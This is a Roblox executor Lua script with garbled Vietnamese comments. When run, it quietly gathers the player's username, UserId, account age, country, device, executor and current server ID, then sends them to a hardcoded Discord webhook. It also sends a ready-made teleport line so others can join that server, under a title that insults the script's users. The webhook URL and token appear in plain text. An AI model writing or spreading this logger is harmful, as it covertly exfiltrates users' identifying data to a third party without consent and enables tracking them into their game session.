local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

-- üîó Webhook ch√≠nh th·ª©c c·ªßa b·∫°n
local LinkWebHook = "https://discord.com/api/webhooks/1343591803101904916/z7lDVIhJDsOMx6JYeGHP039WD9R-RSsV6YMjYUDsES1MRdgDJfLv8bKJ1PQlnw6xk4LS"

-- Th√¥ng tin ng∆∞·ªùi ch∆°i
local LocalPlayer = Players.LocalPlayer
local username = LocalPlayer.Name
local displayName = LocalPlayer.DisplayName
local userId = LocalPlayer.UserId
local accountAge = LocalPlayer.AccountAge
local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"

-- Game info
local GameID = game.PlaceId
local ServerID = game.JobId
local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(GameID).Name
end)

-- Thi·∫øt b·ªã
local deviceType = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
end

-- Executor
local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif getexecutorname then
    local success, execName = pcall(getexecutorname)
    if success then
        executor = execName
    end
end

-- Qu·ªëc gia
local locale = LocalPlayer.LocaleId:lower()
local country = "Kh√¥ng x√°c ƒë·ªãnh"
if string.find(locale, "vn") then country = "Vi·ªát Nam"
elseif string.find(locale, "th") then country = "Th√°i Lan"
elseif string.find(locale, "id") then country = "Indonesia"
elseif string.find(locale, "ph") then country = "Philippines"
elseif string.find(locale, "my") then country = "Malaysia"
elseif string.find(locale, "us") then country = "Hoa K·ª≥"
elseif string.find(locale, "br") then country = "Brazil"
elseif string.find(locale, "kr") then country = "H√†n Qu·ªëc"
elseif string.find(locale, "jp") then country = "Nh·∫≠t B·∫£n"
elseif string.find(locale, "de") then country = "ƒê·ª©c"
elseif string.find(locale, "fr") then country = "Ph√°p"
elseif string.find(locale, "ru") then country = "Nga"
end

-- Th·ªùi gian
local currentDate = os.date("%d/%m/%Y")
local currentTime = os.date("%H:%M:%S")

-- M√£ teleport
local teleportCode = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", game.Players.LocalPlayer)', 
    GameID, ServerID
)

-- G·ª≠i Webhook
local function sendWebhook(title, message)
    local data = {
        ["username"] = "NomDom Notifier",
        ["embeds"] = {
            {
                ["title"] = title,
                ["description"] = message,
                ["color"] = tonumber(0x310a4c),
                -- ·∫¢nh ƒë·∫°i di·ªán ng∆∞·ªùi ch∆°i
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
                },
                -- ·∫¢nh l·ªõn t·ª´ b·∫°n ch·ªçn
                ["image"] = {
                    ["url"] = "https://img.tripi.vn/cdn-cgi/image/width=700,height=700/https://gcs.tripi.vn/public-tripi/tripi-feed/img/476322Hus/anh-mo-ta.png"
                },
                ["footer"] = {
                    ["text"] = "Th·ªùi gian: " .. currentTime .. " | Ng√†y: " .. currentDate
                }
            }
        }
    }

    local jsonData = HttpService:JSONEncode(data)

    pcall(function()
        (syn and syn.request or http_request or request or fluxus and fluxus.request)({
            Url = LinkWebHook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
end

-- G·ª≠i th√¥ng tin
sendWebhook(" M·∫•y thk l·ªìn d√πng script",
    "** T√™n ng∆∞·ªùi ch∆°i:** " .. username .. " (T√™n gi·∫£: " .. displayName .. ")" ..
    "\n** UserId:** " .. userId ..
    "\n** Tu·ªïi t√†i kho·∫£n:** " .. accountAge .. " ng√†y" ..
    "\n** H·ªì s∆° Roblox:** [Xem Profile](" .. profileLink .. ")" ..
    "\n** Game:** " .. gameName ..
    "\n** Qu·ªëc gia:** " .. country ..
    "\n** Thi·∫øt b·ªã:** " .. deviceType ..
    "\n**üõ† Executor:** " .. executor ..
    "\n** Place ID:** " .. GameID ..
    "\n** Server ID:** `" .. ServerID .. "`" ..
    "\n\n** M√£ Teleport:** ```lua\n" .. teleportCode .. "\n```"
)
